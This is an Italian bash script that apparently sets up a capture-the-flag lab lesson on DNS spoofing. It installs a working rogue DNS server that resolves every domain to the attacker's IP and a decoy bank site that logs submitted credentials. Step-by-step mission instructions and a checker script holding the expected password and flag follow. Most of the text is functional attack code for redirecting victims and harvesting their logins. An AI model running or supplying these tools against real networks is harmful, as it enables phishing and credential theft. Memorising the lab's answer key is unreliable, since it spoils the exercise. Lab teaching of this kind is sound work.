#!/usr/bin/env bash
# Lezione 26 · lato Kali · DNS spoofing con un DNS "canaglia" + sito civetta.
# Installa dnsspoof.py (server DNS che risponde con l'IP della Kali) e
# fakeweb.py (sito civetta che cattura le credenziali). Solo stdlib. Idempotente.
set -uo pipefail

UTENTE="${SUDO_USER:-$USER}"
HOME_UTENTE="$(getent passwd "$UTENTE" | cut -d: -f6)"
[ -z "$HOME_UTENTE" ] && HOME_UTENTE="/home/$UTENTE"
DIR="$HOME_UTENTE/lab/lezione-26"

echo "== Lezione 26 · DNS spoofing =="
mkdir -p "$DIR"

# DNS canaglia: risponde a QUALSIASI dominio con l'IP scelto (di default la Kali)
cat > "$DIR/dnsspoof.py" <<'PY'
#!/usr/bin/env python3
# dnsspoof.py - server DNS "canaglia": risponde a ogni query con un IP fisso.
# Uso:  sudo python3 dnsspoof.py [ip_da_restituire] [porta]
#   es: sudo python3 dnsspoof.py 10.10.10.5 53
import socket, sys, struct

SPOOF = sys.argv[1] if len(sys.argv) > 1 else "10.10.10.5"
PORT = int(sys.argv[2]) if len(sys.argv) > 2 else 53


def risposta(query, ip):
    tid = query[:2]
    idx = 12
    while query[idx] != 0:
        idx += 1 + query[idx]
    idx += 1
    domanda = query[12:idx + 4]                  # qname + qtype + qclass
    header = tid + b"\x81\x80" + struct.pack(">HHHH", 1, 1, 0, 0)
    ans = b"\xc0\x0c" + struct.pack(">HHIH", 1, 1, 60, 4) + socket.inet_aton(ip)
    return header + domanda + ans


s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
s.bind(("0.0.0.0", PORT))
print("[*] DNS canaglia su :%d -> ogni dominio risponde %s. Ctrl+C per fermare." %
      (PORT, SPOOF))
while True:
    try:
        data, addr = s.recvfrom(512)
        s.sendto(risposta(data, SPOOF), addr)
        print("[+] query da %s: rispondo %s" % (addr[0], SPOOF), flush=True)
    except Exception:
        pass
PY
chmod +x "$DIR/dnsspoof.py"

# Sito civetta: cattura le credenziali che la vittima invia
cat > "$DIR/fakeweb.py" <<'PY'
#!/usr/bin/env python3
# fakeweb.py - sito civetta: cattura e mostra tutto cio' che riceve. Solo stdlib.
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer


class H(BaseHTTPRequestHandler):
    def do_POST(self):
        n = int(self.headers.get("Content-Length", 0) or 0)
        corpo = self.rfile.read(n).decode("utf-8", "replace")
        print("[+] VITTIMA %s ha inviato:  %s" % (self.client_address[0], corpo), flush=True)
        self.send_response(200); self.end_headers(); self.wfile.write(b"ok")

    def do_GET(self):
        self.send_response(200); self.end_headers()
        self.wfile.write(b"<h1>Banca Online (civetta)</h1>")

    def log_message(self, *a):
        pass


print("[*] Sito civetta su :80. In attesa delle credenziali della vittima...")
ThreadingHTTPServer(("0.0.0.0", 80), H).serve_forever()
PY
chmod +x "$DIR/fakeweb.py"
chown -R "$UTENTE:$UTENTE" "$HOME_UTENTE/lab" 2>/dev/null || true

cat > /usr/local/bin/lab26-verifica <<'EOF'
#!/usr/bin/env bash
set -uo pipefail
if [ "${1:-}" = "HomeBanking#9" ] || [ "$(echo "${1:-}" | tr 'A-Z' 'a-z')" = "homebanking#9" ]; then
  echo "[OK] Hai catturato la password dirottando la vittima con il DNS!"
  echo "FLAG{vittima_dirottata}"
else
  echo "[--] No. Cattura la POST della vittima sul sito civetta e leggi la password."
fi
EOF
chmod 755 /usr/local/bin/lab26-verifica

cat <<'MSG'

------------------------------------------------------------
 MISSIONE · Mandare la vittima dove vuoi tu (DNS spoofing)
------------------------------------------------------------
 Il bersaglio chiede al DNS "dov'e' aggiornamenti.banca.local?" e si fida
 della risposta. Se il DNS e' il TUO, lo mandi sul tuo sito civetta.

 Cartella:  ~/lab/lezione-26

 [ ] 1  Avvia il DNS canaglia (risponde con la tua Kali)       (avvio)
        cd ~/lab/lezione-26
        sudo python3 dnsspoof.py 10.10.10.5 53

 [ ] 2  In un ALTRO terminale, avvia il sito civetta           (+40)
        sudo python3 fakeweb.py
        # quando la vittima "aggiorna", invia le sue credenziali QUI: c'e' la flag

 [ ] 3  Leggi la password della vittima                        (+30)
        lab26-verifica <la-password-catturata>

 Concetti:  DNS  risoluzione dei nomi  DNS server canaglia  sito civetta
 Etica: SOLO nel laboratorio isolato.
------------------------------------------------------------
MSG
